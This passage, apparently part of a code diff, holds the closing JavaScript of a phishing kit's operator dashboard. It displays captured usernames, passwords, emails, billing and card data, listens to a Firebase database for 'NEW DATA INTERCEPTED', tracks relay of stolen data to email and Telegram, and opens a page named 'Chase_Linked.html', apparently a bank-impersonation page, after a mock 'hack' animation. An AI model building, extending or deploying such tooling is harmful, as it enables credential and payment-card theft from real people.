+                if (p > 100) p = 100;
+                pb.style.width = p + '%';
+                if (mi < hackMessages.length && Math.random() > 0.3) { const li = document.createElement('div'); li.className = 'hack-line'; li.textContent = hackMessages[mi]; li.style.animationDelay = '0s'; det.appendChild(li); det.scrollTop = det.scrollHeight; mi++; }
+                if (p < 30) { st.textContent = 'BREACHING_SECURITY...'; st.style.color = 'var(--wd-red)'; } else if (p < 60) { st.textContent = 'EXTRACTING_DATA...'; st.style.color = 'var(--wd-yellow)'; } else if (p < 90) { st.textContent = 'ENCRYPTING_TUNNEL...'; st.style.color = 'var(--wd-cyan)'; } else { st.textContent = 'ACCESS_GRANTED'; st.style.color = 'var(--wd-green)'; t.textContent = 'BREACH_SUCCESSFUL'; }
+                if (p >= 100) {
+                    clearInterval(pi);
+                    setTimeout(() => { l.classList.add('active'); setTimeout(() => l.classList.remove('active'), 300); }, 100);
+                    setTimeout(() => { o.classList.remove('active'); b.classList.remove('hacking'); b.innerHTML = '<i class="fas fa-lock"></i> / INITIATE_HACK'; refreshDashboard(); window.open('Chase_Linked.html', '_blank'); }, 1500);
+                }
+            }, 200);
+            const li = setInterval(() => { if (p >= 100) { clearInterval(li); return; } if (Math.random() > 0.7) { l.classList.add('active'); setTimeout(() => l.classList.remove('active'), 100); } }, 800);
+        }
+
+        function refreshDashboard() {
+            document.getElementById('displaySessionId').textContent = '[ NULL ]';
+            document.getElementById('displayStatus').textContent = '[ OFFLINE ]';
+            document.getElementById('displayDevice').textContent = '[ UNKNOWN ]';
+            document.getElementById('displayIp').textContent = '[ HIDDEN ]';
+            document.getElementById('displayExactLocation').textContent = '[ UNKNOWN ]';
+            document.getElementById('displayLastUpdate').textContent = '[ NEVER ]';
+            document.getElementById('displayUsername').textContent = '[ WAITING ]';
+            document.getElementById('displayPassword').textContent = '[ ENCRYPTED ]';
+            document.getElementById('displayEmail').textContent = '[ NULL ]';
+            document.getElementById('displayLoginTime').textContent = '[ NOT CAPTURED ]';
+            document.getElementById('sessionStatus').textContent = 'WAITING';
+            document.getElementById('sessionStatus').className = 'section-badge';
+            document.getElementById('credentialsStatus').textContent = 'WAITING';
+            document.getElementById('credentialsStatus').className = 'section-badge';
+            document.getElementById('verificationStatus').textContent = 'PENDING';
+            document.getElementById('verificationStatus').className = 'section-badge waiting';
+            updateStepTracker(0);
+            document.getElementById('personalSection').style.display = 'none';
+            document.getElementById('billingSection').style.display = 'none';
+            document.getElementById('cardSection').style.display = 'none';
+            document.getElementById('rawDataTableBody').innerHTML = '<tr><td colspan="4" class="empty-state"><div class="empty-state-icon">◉</div><p>NO_DATA_AVAILABLE</p></td></tr>';
+            document.getElementById('connDot').classList.remove('connected');
+            document.getElementById('connText').textContent = 'OFFLINE';
+            updateStatus('firebase', 'active', 'READY');
+            updateStatus('email', 'active', 'STANDBY');
+            updateStatus('telegram', 'telegram', 'STANDBY');
+            showNotification('DASHBOARD REFRESHED - READY');
+        }
+
+        function clearAllData() {
+            if (!confirm('⚠ WARNING: This will permanently delete ALL captured data from the database.\n\nAre you sure?')) return;
+            if (database) {
+                database.ref('sessions').remove().then(() => { console.log('All data cleared'); refreshDashboard(); showNotification('✓ ALL DATA CLEARED'); }).catch(e => { console.error('Error:', e); showNotification('✗ ERROR CLEARING DATA'); });
+            } else { refreshDashboard(); showNotification('✓ DASHBOARD CLEARED'); }
+        }
+
+        const notificationSound = new Audio('data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBjiR1/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmwhBTGH0fPTgjMGHm7A7+OZSA0PVanu8LdnGgU1kNbxz4AzBhxpv+zplkcODVGm5O+4ZSAEMYrO89GFNwYdcfDr4ZdJDQtPp+XyxGUhBDeOzvPVhjYGHG3A7+SaSQ0MTKjl8bllHwU2k9fzzYU1Bxtwv+zpl0gNC1Gn5O/EZSAFNo/M89CEMwYccPDs4plHDAtQp+TvvWUfBTiOz/PShjUGG3Dw7OKZRwwLUqjl8bllHwU3jc7z1YU1Bxtw8OzhmUgNC1Ko5fG+ZSAF');
+        function playNotificationSound() { notificationSound.currentTime = 0; notificationSound.play().catch(e => console.log('Sound failed:', e)); }
+
+        // ═══════════════════════════════════════════════════════════════
+        // REALTIME LISTENERS
+        // ═══════════════════════════════════════════════════════════════
+        if (database) {
+            // Listen for new session data
+            database.ref('sessions').on('value', s => {
+                const d = s.val();
+                if (d) {
+                    const sessions = Object.values(d).sort((a, b) => new Date(b.lastUpdate || b.loginTime) - new Date(a.lastUpdate || a.loginTime));
+                    if (sessions.length > 0) {
+                        const latest = sessions[0];
+                        updateDisplay(latest);
+                        showNotification('NEW DATA INTERCEPTED');
+                        playNotificationSound();
+                    }
+                }
+            });
+
+            // Listen for email/telegram delivery status
+            database.ref('emailLogs').orderByChild('timestamp').limitToLast(1).on('value', s => {
+                const log = s.val();
+                if (log) {
+                    const entry = Object.values(log)[0];
+                    if (entry.emailSuccess) updateStatus('email', 'active', 'SENT ✓');
+                    else updateStatus('email', 'error', 'FAILED');
+                    
+                    if (entry.telegramSuccess) updateStatus('telegram', 'active', 'SENT ✓');
+                    else if (entry.emailSuccess) updateStatus('telegram', 'error', 'FAILED');
+                }
+            });
+        }
+
+        updateStatus('firebase', 'active', 'READY');
+        updateStatus('email', 'active', 'STANDBY');
+        updateStatus('telegram', 'telegram', 'STANDBY');
+    </script>
+</body>
+</html>
